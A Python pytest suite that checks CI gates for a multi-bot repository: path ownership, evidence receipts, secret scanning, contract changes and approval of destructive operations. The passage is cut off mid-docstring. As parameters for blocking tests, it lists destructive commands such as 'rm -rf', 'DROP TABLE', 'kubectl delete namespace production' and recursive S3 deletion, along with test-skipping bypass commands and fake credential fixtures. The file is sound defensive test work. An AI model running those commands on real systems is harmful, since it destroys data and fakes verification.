"""Gate test suite.

Implements the test schedule in docs/quality-gates.md. Every gate is exercised against real
fixtures — a temporary git repository for the diff-based gates, real receipt JSON for the rest —
so the tests run the gates the way CI does rather than mocking them.

The property under test throughout: **does the gate actually block what it claims to block?**
A gate that has silently stopped working looks identical to a gate with nothing to catch.

    python3 -m pytest ci/tests/ -v
"""

from __future__ import annotations

import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path

import pytest

GATES = Path(__file__).resolve().parents[1] / "gates"
REPO_ROOT = Path(__file__).resolve().parents[2]
MANIFEST = REPO_ROOT / "ownership.yaml"


def run_gate(script: str, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(GATES / script), *args],
        capture_output=True, text=True, cwd=REPO_ROOT,
    )


def _extract_candidate_gates() -> Path | None:
    """Materialize ci/gates/ as it exists at HEAD — the tip actually proposed for merge —
    into its own directory, independent of whatever sits in the working tree.

    gate-self-test overlays the *working tree* copy of ci/gates/ with the base ref's version
    before this suite runs (Greptile P1 4140823500), so a gate change this PR makes is
    invisible to run_gate() until the PR has already merged (Greptile P1, PR #45,
    "CI skips new gate tests"). `git checkout <base> -- ci/gates/` rewrites the working tree
    and the index; it does not touch HEAD, so HEAD's own commit object still holds the exact
    candidate this PR proposes. `git archive HEAD` reads that, never the working tree, so it
    yields the real candidate whether or not an overlay has run.

    Returns None — never raises — when HEAD's history can't be read (no .git/, e.g. a bare
    source export), so callers can skip cleanly instead of failing collection.
    """
    try:
        archive = subprocess.run(
            ["git", "archive", "--format=tar", "HEAD", "--", "ci/gates"],
            capture_output=True, cwd=REPO_ROOT,
        )
        if archive.returncode != 0 or not archive.stdout:
            return None
        dest = Path(tempfile.mkdtemp(prefix="candidate-gates-"))
        with tarfile.open(fileobj=io.BytesIO(archive.stdout)) as tar:
            tar.extractall(dest, filter="data")
        return dest / "ci" / "gates"
    except (OSError, subprocess.SubprocessError, tarfile.TarError):
        return None


CANDIDATE_GATES = _extract_candidate_gates()


def _sandbox_limits() -> None:
    """preexec_fn for run_candidate_gate(): bound CPU, memory and process count before the
    candidate script gets control. Runs in the child, after fork and before exec.

    Each limit is best-effort: a host whose existing hard limit already sits below what we
    ask for would otherwise turn a defense-in-depth measure into a hard crash of the whole
    job. The cwd/env isolation in run_candidate_gate() is the primary control; these bound
    a runaway process rather than gate whether the sandbox runs at all.
    """
    import resource

    for limit, value in (
        (resource.RLIMIT_CPU, (20, 20)),
        (resource.RLIMIT_AS, (1024 * 1024 * 1024,) * 2),
        (resource.RLIMIT_NPROC, (64, 64)),
    ):
        try:
            resource.setrlimit(limit, value)
        except (ValueError, OSError):
            pass


def run_candidate_gate(script: str, *args: str) -> subprocess.CompletedProcess:
    """Run a gate script from the untouched PR-tip candidate — sandboxed, not trusted.

    Unlike run_gate(), this never reads the working tree's (possibly base-overlaid) copy: it
    runs the exact candidate this PR proposes to merge, so new or changed gate behaviour is
    exercised for real by this required check instead of silently skipping until after merge.
    The trust the base overlay withholds is bounded here rather than granted outright — a
    scratch cwd that is not the real checkout, a stripped environment, and CPU/memory/process
    ceilings with a hard wall-clock timeout. This does not isolate the network; a stronger
    sandbox (container, network namespace) is an infra-owned follow-up if one is ever needed.

    Skips (does not fail) when CANDIDATE_GATES could not be extracted, e.g. no .git/ present.
    """
    if CANDIDATE_GATES is None:
        pytest.skip("git history for HEAD is unavailable; cannot extract the candidate gate")
    workdir = Path(tempfile.mkdtemp(prefix="gate-sandbox-"))
    try:
        return subprocess.run(
            [sys.executable, str(CANDIDATE_GATES / script), *args],
            capture_output=True, text=True, cwd=workdir,
            env={"PATH": os.environ.get("PATH", ""), "HOME": str(workdir)},
            timeout=30,
            preexec_fn=_sandbox_limits if os.name == "posix" else None,
        )
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def _receipt_dict(**overrides) -> dict:
    receipt = {
        "task_id": "test-task",
        "bot": "bot-01-systems-backend",
        "commands": [
            {"cmd": "pytest tests/", "exit_code": 0, "duration_s": 3.2},
        ],
        "claims": [
            {"claim": "unit tests pass", "evidence_command_index": 0},
        ],
        "unverified": ["integration tests not run — no database in this environment"],
        "files_changed": ["services/api/main.py"],
        "approved_by": "bot-06-quality-security",
    }
    receipt.update(overrides)
    return receipt


def write_receipt(tmp_path: Path, **overrides) -> Path:
    path = tmp_path / "receipt.json"
    path.write_text(json.dumps(_receipt_dict(**overrides)))
    return path


# ===========================================================================
# G-1 — path ownership
# ===========================================================================

class TestG1Ownership:

    def test_manifest_self_check_passes(self):
        r = run_gate("check_ownership.py", "--validate-manifest")
        assert r.returncode == 0, r.stderr

    def test_owned_path_allowed(self):
        r = run_gate("check_ownership.py", "--bot", "bot-01-systems-backend",
                     "--files", "services/api/main.py", "crates/core/src/lib.rs")
        assert r.returncode == 0, r.stderr
        assert "PASS" in r.stdout

    def test_foreign_path_blocked(self):
        """Android bot editing a Rust service must fail."""
        r = run_gate("check_ownership.py", "--bot", "bot-03-android",
                     "--files", "services/api/main.py")
        assert r.returncode == 1
        assert "FOREIGN" in r.stderr
        assert "bot-01-systems-backend" in r.stderr

    def test_unowned_path_blocked(self):
        """A path matching no rule is where two bots collide silently."""
        r = run_gate("check_ownership.py", "--bot", "bot-01-systems-backend",
                     "--files", "some/random/unclaimed/file.xyz")
        assert r.returncode == 1
        assert "UNOWNED" in r.stderr

    def test_last_matching_pattern_wins(self):
        """**/*.py is owned by backend; a .py under infra/ is still backend by rule order."""
        r = run_gate("check_ownership.py", "--bot", "bot-01-systems-backend",
                     "--files", "migrations/0001_init.py")
        assert r.returncode == 0, r.stderr

    def test_contract_surface_flagged(self):
        r = run_gate("check_ownership.py", "--bot", "bot-06-quality-security",
                     "--files", "contracts/api/notifications.yaml")
        assert r.returncode == 0, r.stderr
        assert "G-4 applies" in r.stdout

    def test_unknown_bot_rejected(self):
        r = run_gate("check_ownership.py", "--bot", "bot-99-nonexistent",
                     "--files", "services/api/main.py")
        assert r.returncode != 0

    @pytest.mark.parametrize("path,bot", [
        ("android/app/src/Main.kt",        "bot-03-android"),
        ("ios/App/ContentView.swift",      "bot-04-ios"),
        ("web/components/Button.tsx",      "bot-02-web-edge"),
        ("infra/vpc.tf",                   "bot-05-infrastructure"),
        ("crates/engine/src/lib.rs",       "bot-01-systems-backend"),
        ("ci/gates/check_receipt.py",      "bot-06-quality-security"),
    ])
    def test_each_platform_routes_to_its_owner(self, path, bot):
        r = run_gate("check_ownership.py", "--bot", bot, "--files", path)
        assert r.returncode == 0, f"{path} should belong to {bot}\n{r.stderr}"


# ===========================================================================
# G-2 — verification receipts
# ===========================================================================

class TestG2Receipts:

    def test_valid_receipt_passes(self, tmp_path):
        r = run_gate("check_receipt.py", "--receipt", str(write_receipt(tmp_path)))
        assert r.returncode == 0, r.stderr

    def test_missing_receipt_blocked(self, tmp_path):
        r = run_gate("check_receipt.py", "--receipt", str(tmp_path / "nope.json"))
        assert r.returncode == 1
        assert "no receipt" in r.stderr

    def test_no_commands_blocked(self, tmp_path):
        """Nothing was run, so nothing is verified."""
        p = write_receipt(tmp_path, commands=[], claims=[])
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "no commands recorded" in r.stderr

    def test_claim_without_evidence_blocked(self, tmp_path):
        p = write_receipt(tmp_path, claims=[{"claim": "it works"}])
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "cites no command" in r.stderr

    def test_claim_citing_failing_command_blocked(self, tmp_path):
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "pytest tests/", "exit_code": 1}],
            claims=[{"claim": "tests pass", "evidence_command_index": 0}],
        )
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "exited 1" in r.stderr

    def test_claim_citing_nonexistent_command_blocked(self, tmp_path):
        p = write_receipt(tmp_path, claims=[{"claim": "x", "evidence_command_index": 99}])
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "does not exist" in r.stderr

    def test_self_approval_blocked(self, tmp_path):
        p = write_receipt(tmp_path, approved_by="bot-01-systems-backend")
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "self-approval" in r.stderr

    def test_missing_approval_blocked(self, tmp_path):
        p = write_receipt(tmp_path, approved_by=None)
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "approved_by" in r.stderr

    @pytest.mark.parametrize("cmd", [
        "git commit --no-verify -m 'wip'",
        "./gradlew build -x test",
        "pytest tests/ || true",
        "mvn package -DskipTests",
        "xcodebuild -skipTesting:MyTests test",
        "npm test --passWithNoTests",
        "terraform apply --auto-approve",
        "cargo test 2>/dev/null",
    ])
    def test_bypass_commands_blocked(self, tmp_path, cmd):
        """These produce a green result from work that never ran."""
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": cmd, "exit_code": 0}],
            claims=[{"claim": "done", "evidence_command_index": 0}],
        )
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1, f"{cmd!r} should have been rejected"
        assert "bypass" in r.stderr

    def test_missing_exit_code_blocked(self, tmp_path):
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "pytest tests/"}],
            claims=[{"claim": "tests pass", "evidence_command_index": 0}],
        )
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "exit_code" in r.stderr

    @pytest.mark.parametrize("vague", ["some edge cases", "minor things", "full testing"])
    def test_vague_unverified_blocked(self, tmp_path, vague):
        p = write_receipt(tmp_path, unverified=[vague])
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "too vague" in r.stderr

    def test_specific_unverified_passes(self, tmp_path):
        p = write_receipt(tmp_path, unverified=[
            "iOS 15 not tested — only iOS 17 simulator available",
            "Production data volumes not simulated; tested against 1k rows",
        ])
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 0, r.stderr

    def test_exhaustive_claim_on_thin_evidence_blocked_in_strict(self, tmp_path):
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "pytest tests/unit", "exit_code": 0}],
            claims=[{"claim": "everything works, no regressions", "evidence_command_index": 0}],
        )
        r = run_gate("check_receipt.py", "--receipt", str(p), "--strict")
        assert r.returncode == 1
        assert "exhaustiveness" in r.stderr

    def test_bot_mismatch_blocked(self, tmp_path):
        p = write_receipt(tmp_path, bot="bot-01-systems-backend")
        r = run_gate("check_receipt.py", "--receipt", str(p), "--bot", "bot-03-android")
        assert r.returncode == 1
        assert "does not match" in r.stderr

    def test_reproduction_then_fix_pattern_passes(self, tmp_path):
        """A failing command is valid evidence: it proves the bug was real."""
        p = write_receipt(
            tmp_path,
            commands=[
                {"cmd": "pytest tests/test_pagination.py", "exit_code": 1},
                {"cmd": "pytest tests/test_pagination.py", "exit_code": 0},
                {"cmd": "pytest tests/", "exit_code": 0},
            ],
            claims=[
                {"claim": "reproduced the bug", "evidence_command_index": 0,
                 "expects_failure": True},
                {"claim": "fix resolves it", "evidence_command_index": 1},
                {"claim": "no regressions in the suite", "evidence_command_index": 2},
            ],
        )
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 0, r.stderr

    def test_expects_failure_cannot_launder_a_passing_command(self, tmp_path):
        """The flag asserts the command failed. It must not become a way to mark
        any claim exempt from its evidence."""
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "pytest tests/", "exit_code": 0}],
            claims=[{"claim": "reproduced the bug", "evidence_command_index": 0,
                     "expects_failure": True}],
        )
        r = run_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "expects_failure but command[0] exited 0" in r.stderr

    def test_expects_failure_cannot_waive_strict_exhaustiveness(self, tmp_path):
        """A claim's own expects_failure must not borrow OTHER, unrelated commands
        elsewhere in the receipt to look better-supported than it is. This claim is
        evidenced by one narrow, failing command (a single test file, not the suite) while
        the receipt separately records a passing run of the whole suite for something else
        — that second command cannot be what makes THIS claim exhaustive, so its presence
        is exactly the original bypass this check exists to catch (Greptile P1, PR #45).

        Runs against the candidate (run_candidate_gate), not the working tree (run_gate):
        gate-self-test overlays ci/gates/ with the base ref on pull requests (Greptile P1
        4140823500), and this fix is new in this PR (Greptile P1, PR #45, "New tests fail in
        CI"). See run_candidate_gate() for how this is kept safe to run pre-merge.
        """
        p = write_receipt(
            tmp_path,
            commands=[
                {"cmd": "pytest tests/test_x.py", "exit_code": 1},
                {"cmd": "pytest tests/", "exit_code": 0},
            ],
            claims=[
                {"claim": "confirmed every case fails", "evidence_command_index": 0,
                 "expects_failure": True},
            ],
        )
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p), "--strict")
        assert r.returncode == 1
        assert "exhaustive" in r.stderr.lower()

    def test_expects_failure_alone_can_satisfy_strict_exhaustiveness(self, tmp_path):
        """A single expected-failure command CAN be exhaustive evidence when it is the
        receipt's only command: a search that exits non-zero exactly when it finds nothing
        across its whole target is reproduction evidence and total coverage at once
        (Greptile P1, PR #45, "Valid negative evidence rejected" — the prior, unconditional
        version of this check rejected this receipt regardless of what the command proved).
        With nothing else in the receipt to borrow from, the command's own scope is left to
        a human reviewer (approved_by) to judge, same as any other evidence-matching
        question this gate cannot verify by itself.
        """
        p = write_receipt(
            tmp_path,
            commands=[
                {"cmd": "grep -c '=[^=]' .env.example", "exit_code": 1},
            ],
            claims=[
                {"claim": "every value in .env.example is still empty",
                 "evidence_command_index": 0, "expects_failure": True},
            ],
        )
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p), "--strict")
        assert r.returncode == 0, r.stderr


# ===========================================================================
# G-2 — loop_acks (degraded-mode turn acknowledgements)
# ===========================================================================

def valid_ack(**overrides) -> dict:
    ack = {
        "condition": "brief_degraded",
        "operation": "degraded-loop: repo work without a memory brief",
        "ack_id": "ack-test-001",
        "human_granted_by": "Ove",
        "relayed_by": "bot-00-programming-lead",
        "at": "2026-09-30T09:41:11Z",
        "scope": "one turn, ticket test-task",
    }
    ack.update(overrides)
    return ack


class TestG2LoopAcks:
    """loop_acks validation is new in this PR, so every test here runs against the candidate
    (run_candidate_gate), not the working tree (run_gate): gate-self-test overlays ci/gates/
    with the base ref on pull requests (Greptile P1 4140823500), and the base ref predates
    this feature (Greptile P1, PR #45, "CI skips new gate tests"). See run_candidate_gate()
    for how this is kept safe to run pre-merge.
    """

    def test_omitted_loop_acks_passes(self, tmp_path):
        """A receipt for a turn that never went degraded need not carry the field at all."""
        r = run_candidate_gate("check_receipt.py", "--receipt", str(write_receipt(tmp_path)))
        assert r.returncode == 0, r.stderr

    def test_empty_loop_acks_passes(self, tmp_path):
        p = write_receipt(tmp_path, loop_acks=[])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 0, r.stderr

    def test_valid_loop_ack_passes(self, tmp_path):
        p = write_receipt(tmp_path, loop_acks=[valid_ack()])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 0, r.stderr

    def test_null_loop_acks_blocked(self, tmp_path):
        """An explicit null is a different shape from omitting the field and must not be
        read the same way — it is a malformed field, not 'no ack'."""
        p = write_receipt(tmp_path, loop_acks=None)
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "must be a list" in r.stderr
        assert "do not set it to null" in r.stderr

    def test_non_list_loop_acks_blocked(self, tmp_path):
        p = write_receipt(tmp_path, loop_acks={"condition": "brief_degraded"})
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "must be a list" in r.stderr

    def test_non_dict_entries_blocked(self, tmp_path):
        """A list of strings must fail cleanly rather than crash on attribute access."""
        p = write_receipt(tmp_path, loop_acks=["brief_degraded"])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "must be an object" in r.stderr

    def test_missing_ack_fields_blocked(self, tmp_path):
        p = write_receipt(tmp_path, loop_acks=[{"condition": "brief_degraded"}])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "is missing" in r.stderr

    @pytest.mark.parametrize("granter", [True, 12345, ["Ove"], {"name": "Ove"}])
    def test_human_granted_by_non_string_blocked(self, tmp_path, granter):
        """A truthy non-string value must not dodge the missing-field check (it is truthy)
        and then dodge the seat-name check (it does not look like a seat)."""
        p = write_receipt(tmp_path, loop_acks=[valid_ack(human_granted_by=granter)])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "must be a string naming a person" in r.stderr

    def test_human_granted_by_seat_blocked(self, tmp_path):
        p = write_receipt(tmp_path, loop_acks=[valid_ack(human_granted_by="bot-01-systems-backend")])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "is a seat, not a human" in r.stderr

    def test_human_granted_by_desk_connector_blocked(self, tmp_path):
        """`desk-<seat>` is a documented OAuth connector name, not a person."""
        p = write_receipt(tmp_path, loop_acks=[valid_ack(human_granted_by="desk-lead")])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "is a seat, not a human" in r.stderr

    def test_invalid_condition_blocked(self, tmp_path):
        p = write_receipt(tmp_path, loop_acks=[valid_ack(condition="not-a-real-condition")])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "is not one of" in r.stderr

    def test_scope_non_string_blocked(self, tmp_path):
        p = write_receipt(tmp_path, loop_acks=[valid_ack(scope=["test-task"])])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "scope must be a string" in r.stderr

    @pytest.mark.parametrize("scope", ["one turn, ticket some-other-ticket", "all turns"])
    def test_scope_unbound_from_task_blocked(self, tmp_path, scope):
        """A scope naming another ticket, or a blanket scope, must not authorise this turn."""
        p = write_receipt(tmp_path, loop_acks=[valid_ack(scope=scope)])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "does not name this receipt's task_id" in r.stderr

    def test_scope_bound_to_task_passes(self, tmp_path):
        p = write_receipt(tmp_path, loop_acks=[valid_ack(scope="one turn, ticket test-task")])
        r = run_candidate_gate("check_receipt.py", "--receipt", str(p))
        assert r.returncode == 0, r.stderr


# ===========================================================================
# G-3 — committed secrets
# ===========================================================================

class TestG3Secrets:

    def _scan(self, tmp_path: Path, content: str, name: str = "config.py"):
        (tmp_path / name).write_text(content)
        return run_gate("check_secrets.py", "--root", str(tmp_path), "--files", name)

    @pytest.mark.parametrize("content,label", [
        ('AWS_KEY = "AKIAIOSFODNN7EXAMPLE"',                       "AWS access key"),  # pragma: allowlist secret — gate fixture
        ('token = "ghp_016C7f8a9B2c3D4e5F6g7H8i9J0k1L2m3N4o5"',    "GitHub token"),  # pragma: allowlist secret — gate fixture
        ('SLACK = "xoxb-123456789012-1234567890123-abcdefghijkl"', "Slack token"),  # pragma: allowlist secret — gate fixture
        ('key = "AIzaSyD-abcdefghijklmnopqrstuvwxyz1234567"',      "Google API key"),  # pragma: allowlist secret — gate fixture
        ('DB = "postgresql://admin:hunter2@db.internal:5432/prod"', "connection string"),  # pragma: allowlist secret — gate fixture
        ('-----BEGIN RSA PRIVATE KEY-----',                        "private key block"),  # pragma: allowlist secret — gate fixture
        ('STRIPE = "sk_live_abcdefghijklmnopqrstuvwx"',            "Stripe live key"),  # pragma: allowlist secret — gate fixture
    ])
    def test_known_secret_formats_blocked(self, tmp_path, content, label):
        r = self._scan(tmp_path, content)
        assert r.returncode == 1, f"{label} should have been caught"

    def test_high_entropy_with_secret_name_blocked(self, tmp_path):
        r = self._scan(tmp_path, 'api_secret = "8Kf3nQ9pL2mX7vB4tR6wY1zA5cD0eG8h"')  # pragma: allowlist secret — gate fixture
        assert r.returncode == 1
        assert "high_entropy" in r.stderr

    def test_allowlist_pragma_respected(self, tmp_path):
        r = self._scan(
            tmp_path,
            'EXAMPLE = "AKIAIOSFODNN7EXAMPLE"  # pragma: allowlist secret — AWS docs example',
        )
        assert r.returncode == 0, r.stderr

    @pytest.mark.parametrize("content", [
        'API_KEY = os.environ["API_KEY"]',
        'password = "changeme"',
        'token = "<your-token-here>"',
        'secret = "${VAULT_SECRET}"',
        'api_key = "xxxxxxxxxxxxxxxxxxxxxxxx"',
        'key = "aaaaaaaaaaaaaaaaaaaaaaaaaaa"',
    ])
    def test_placeholders_not_flagged(self, tmp_path, content):
        r = self._scan(tmp_path, content)
        assert r.returncode == 0, f"{content!r} is a placeholder, not a secret\n{r.stderr}"

    def test_secret_is_redacted_in_output(self, tmp_path):
        """The scanner must not print the secret it found into CI logs."""
        secret = "ghp_016C7f8a9B2c3D4e5F6g7H8i9J0k1L2m3N4o5"  # pragma: allowlist secret — gate fixture
        r = self._scan(tmp_path, f'token = "{secret}"')
        assert r.returncode == 1
        assert secret not in r.stderr, "the gate leaked the secret into its own output"

    def test_terraform_state_always_blocked(self, tmp_path):
        """tfstate holds generated passwords verbatim."""
        (tmp_path / "terraform.tfstate").write_text('{"version": 4}')
        r = run_gate("check_secrets.py", "--root", str(tmp_path), "--files", "terraform.tfstate")
        assert r.returncode == 1
        assert "never be committed" in r.stderr

    def test_ordinary_code_passes(self, tmp_path):
        r = self._scan(tmp_path, "def add(a: int, b: int) -> int:\n    return a + b\n")
        assert r.returncode == 0, r.stderr


# ===========================================================================
# G-4 — contract-first changes
# ===========================================================================

class TestG4Contracts:

    def _change_doc(self, tmp_path: Path, **overrides) -> Path:
        import yaml
        doc = {
            "change_id": "feat-notifications-v1",
            "proposed_by": "bot-01-systems-backend",
            "surface": "contracts/api/notifications.yaml",
            "breaking": False,
            "version": "1.4.0",
            "summary": "Adds device token registration.",
            "semantic_changes": [],
            "consumers_required": ["bot-02-web-edge", "bot-03-android", "bot-04-ios"],
            "acknowledgements": [
                {"bot": "bot-02-web-edge", "ack": True, "note": "no client change needed"},
                {"bot": "bot-03-android", "ack": True, "note": "FCM token format fits"},
                {"bot": "bot-04-ios", "ack": True, "note": "APNs tokens are hex strings"},
            ],
        }
        doc.update(overrides)
        path = tmp_path / "change.yaml"
        path.write_text(yaml.safe_dump(doc))
        return path

    def test_no_contract_touched_passes(self):
        r = run_gate("check_contracts.py", "--files", "services/api/main.py")
        assert r.returncode == 0, r.stderr

    def test_contract_touched_without_change_doc_blocked(self):
        r = run_gate("check_contracts.py", "--files", "contracts/api/notifications.yaml")
        assert r.returncode == 1
        assert "no change document" in r.stderr

    def test_valid_nonbreaking_change_passes(self, tmp_path):
        r = run_gate("check_contracts.py", "--files", "contracts/api/notifications.yaml",
                     "--change", str(self._change_doc(tmp_path)))
        assert r.returncode == 0, r.stderr

    def test_breaking_change_missing_ack_blocked(self, tmp_path):
        doc = self._change_doc(
            tmp_path, breaking=True, version="2.0.0",
            migration_note="Replace user_id with account_id.",
            acknowledgements=[{"bot": "bot-02-web-edge", "ack": True}],  # two missing
        )
        r = run_gate("check_contracts.py", "--files", "contracts/api/notifications.yaml",
                     "--change", str(doc))
        assert r.returncode == 1
        assert "bot-03-android" in r.stderr
        assert "bot-04-ios" in r.stderr

    def test_breaking_change_without_migration_note_blocked(self, tmp_path):
        doc = self._change_doc(tmp_path, breaking=True, version="2.0.0")
        r = run_gate("check_contracts.py", "--files", "contracts/api/notifications.yaml",
                     "--change", str(doc))
        assert r.returncode == 1
        assert "migration_note" in r.stderr

    def test_consumer_rejection_blocks(self, tmp_path):
        doc = self._change_doc(
            tmp_path, breaking=True, version="2.0.0",
            migration_note="Replace user_id with account_id.",
            acknowledgements=[
                {"bot": "bot-02-web-edge", "ack": True},
                {"bot": "bot-03-android", "ack": True},
                {"bot": "bot-04-ios", "ack": False,
                 "note": "cannot ship before the next App Store release"},
            ],
        )
        r = run_gate("check_contracts.py", "--files", "contracts/api/notifications.yaml",
                     "--change", str(doc))
        assert r.returncode == 1
        assert "REJECTED" in r.stderr

    def test_breaking_change_without_major_bump_blocked(self, tmp_path):
        doc = self._change_doc(
            tmp_path, breaking=True, version="1.5.0", previous_version="1.4.0",
            migration_note="Removes user_id.",
            acknowledgements=[
                {"bot": b, "ack": True}
                for b in ("bot-02-web-edge", "bot-03-android", "bot-04-ios")
            ],
        )
        r = run_gate("check_contracts.py", "--files", "contracts/api/notifications.yaml",
                     "--change", str(doc))
        assert r.returncode == 1
        assert "major version did not increase" in r.stderr

    def test_missing_semantic_changes_declaration_blocked(self, tmp_path):
        """No tool detects a meaning change. It must be declared either way."""
        import yaml
        doc = yaml.safe_load(self._change_doc(tmp_path).read_text())
        del doc["semantic_changes"]
        path = tmp_path / "change2.yaml"
        path.write_text(yaml.safe_dump(doc))
        r = run_gate("check_contracts.py", "--files", "contracts/api/notifications.yaml",
                     "--change", str(path))
        assert r.returncode == 1
        assert "semantic_changes" in r.stderr


# ===========================================================================
# G-5 / G-6 — rollback plans and destructive operations
# ===========================================================================

class TestG5G6RollbackAndDestructive:

    def test_no_deploy_no_destructive_passes(self, tmp_path):
        r = run_gate("check_rollback.py", "--receipt", str(write_receipt(tmp_path)))
        assert r.returncode == 0, r.stderr

    def test_deploy_without_rollback_plan_blocked(self, tmp_path):
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "vercel deploy --prod", "exit_code": 0}],
            claims=[{"claim": "deployed", "evidence_command_index": 0}],
            rollback_plan=None,
        )
        r = run_gate("check_rollback.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "rollback_plan is empty" in r.stderr

    def test_trivial_rollback_plan_blocked(self, tmp_path):
        """'Roll back' is not a plan."""
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "vercel deploy --prod", "exit_code": 0}],
            claims=[{"claim": "deployed", "evidence_command_index": 0}],
            rollback_plan="Roll back if it breaks.",
        )
        r = run_gate("check_rollback.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "too short" in r.stderr

    def test_complete_rollback_plan_passes(self, tmp_path):
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "vercel deploy --prod", "exit_code": 0}],
            claims=[{"claim": "deployed", "evidence_command_index": 0}],
            rollback_plan=(
                "Run `vercel rollback dpl_abc123` to promote the previous deployment. "
                "Recovery under 30 seconds, no rebuild needed. "
                "No data implications: presentation-only change, no schema or cache changes. "
                "Exercised on preview."
            ),
        )
        r = run_gate("check_rollback.py", "--receipt", str(p))
        assert r.returncode == 0, r.stderr

    @pytest.mark.parametrize("cmd", [
        "terraform destroy -target=module.db",
        "kubectl delete namespace production",
        "psql -c 'DROP TABLE accounts'",
        "psql -c 'TRUNCATE events'",
        "git push --force origin main",
        "rm -rf /workspace/shared",
        "docker system prune -a --volumes",
        "aws s3 rm s3://backups --recursive",
    ])
    def test_destructive_without_approval_blocked(self, tmp_path, cmd):
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": cmd, "exit_code": 0}],
            claims=[{"claim": "done", "evidence_command_index": 0}],
            approvals=[],
        )
        r = run_gate("check_rollback.py", "--receipt", str(p))
        assert r.returncode == 1, f"{cmd!r} should require approval"
        assert "NO approvals" in r.stderr

    def test_destructive_with_complete_approval_passes(self, tmp_path):
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "kubectl delete namespace staging-old", "exit_code": 0}],
            claims=[{"claim": "removed the stale namespace", "evidence_command_index": 0}],
            approvals=[{
                "operation": "delete namespace staging-old",
                "approved_by": "ove",
                "at": "2026-09-17T09:00:00Z",
                "blast_radius": "staging-old only; decommissioned 2026-08, no live traffic",
            }],
        )
        r = run_gate("check_rollback.py", "--receipt", str(p))
        assert r.returncode == 0, r.stderr

    def test_incomplete_approval_blocked(self, tmp_path):
        p = write_receipt(
            tmp_path,
            commands=[{"cmd": "terraform destroy", "exit_code": 0}],
            claims=[{"claim": "done", "evidence_command_index": 0}],
            approvals=[{"operation": "destroy", "approved_by": "ove"}],  # no at / blast_radius
        )
        r = run_gate("check_rollback.py", "--receipt", str(p))
        assert r.returncode == 1
        assert "blast_radius" in r.stderr


# ===========================================================================
# G-7 — desk integrity
# ===========================================================================

class TestG7DeskIntegrity:

    ROSTERS = REPO_ROOT / "contracts" / "tool-rosters"
    PACKS = REPO_ROOT / "contracts" / "tool-packs"

    def _desk(self, tmp_path: Path) -> dict[str, Path]:
        """A desk checkout in tmp: the real rosters and packs, empty prompt and template dirs.

        Each test alters one file so the gate is exercised against the real contract shape
        rather than a hand-written approximation of it.
        """
        import shutil
        dirs = {
            "rosters": tmp_path / "rosters",
            "packs": tmp_path / "packs",
            "prompts": tmp_path / "prompts",
            "assembled": tmp_path / "assembled",
            "templates": tmp_path / "templates",
        }
        shutil.copytree(self.ROSTERS, dirs["rosters"])
        shutil.copytree(self.PACKS, dirs["packs"])
        for key in ("prompts", "assembled", "templates"):
            dirs[key].mkdir()
        return dirs

    def _run(self, tmp_path: Path, dirs: dict[str, Path]) -> subprocess.CompletedProcess:
        return run_gate(
            "check_desk_integrity.py", "--repo", str(tmp_path),
            "--rosters-dir", str(dirs["rosters"]),
            "--packs-dir", str(dirs["packs"]),
            "--prompts-dir", str(dirs["prompts"]),
            "--assembled-dir", str(dirs["assembled"]),
            "--templates-dir", str(dirs["templates"]),
        )

    @staticmethod
    def _edit_yaml(path: Path, mutate) -> None:
        import yaml
        doc = yaml.safe_load(path.read_text())
        mutate(doc)
        path.write_text(yaml.safe_dump(doc, sort_keys=False))

    @staticmethod
    def _clone_tool(tools: list, index: int, name: str) -> dict:
        import copy
        tool = copy.deepcopy(tools[index])
        tool["name"] = name
        return tool

    # --- real contracts ---------------------------------------------------

    def test_real_rosters_and_packs_pass(self, tmp_path):
        """The committed contracts obey the rules the README states. Prompt and template
        checks run against empty dirs here: the prompt sources are being moved to
